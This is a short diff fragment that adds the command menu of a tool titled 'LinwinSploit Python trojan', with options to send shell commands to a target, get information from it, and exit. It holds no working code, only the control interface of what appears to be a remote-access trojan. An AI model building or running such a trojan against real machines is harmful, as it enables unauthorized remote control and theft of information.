@@ -1,0 +1,6 @@
+
+|_LinwinSploit Python trojan_virus_|
+
+1. shell        Send shell command to target.
+2. exit         Exit from this attack.
+3. getinfo      Get information from target.
